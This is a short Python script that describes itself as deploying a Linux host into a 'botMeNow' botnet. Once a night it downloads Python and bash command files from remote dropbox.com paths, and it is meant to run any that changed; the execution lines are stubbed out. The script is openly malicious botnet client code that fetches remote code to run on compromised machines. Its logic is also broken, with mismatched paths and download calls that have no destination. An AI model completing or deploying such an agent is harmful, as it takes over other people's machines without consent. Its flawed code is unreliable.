#This python file deploys everything neccessary to add a linux host to the botMeNow botnet
import time
import os
import shutil
import urllib
import filecmp

def botMeNow():
    if not (os.path.isdir("/etc/botMeNow")):
        os.mkdir("/etc/botMeNow")                                   #create botmenow dir

    if not (os.path.isdir("/etc/botMeNow/prev")):
        os.mkdir("/etc/botMeNow/prev")                             #create prev dir

    shutil.copy2('/etc/botMeNow/pycom.py', '/etc/botMeNow/prev')   #put py cmd into prev
    shutil.copy2('/etc/botMeNow/bashcom.sh', '/etc/botMeNow/prev') #put bash cmd into prev

    urllib.urlretrieve("dropbox.com/pycomlocation") #downloads python commands
    urllib.urlretrieve("dropbox.com/bashcom.sh")    #downloads bash commands

    if not (filecmp.cmp('pycom.py','/prev/pycom.py')):
        #run python commands
        return #get rid of this
    if not (filecmp.cmp('bashcom.sh', '/prev/bashcom.sh')):
        # run bash commands
        return  # get rid of this

    return


while True:

    cur_time = time.localtime()
    #print(cur_time.tm_hour)
    if(cur_time.tm_hour==1 and cur_time.tm_min == 0):
        botMeNow()                                  #run botMeNow function at 1:00am
        time.sleep(60)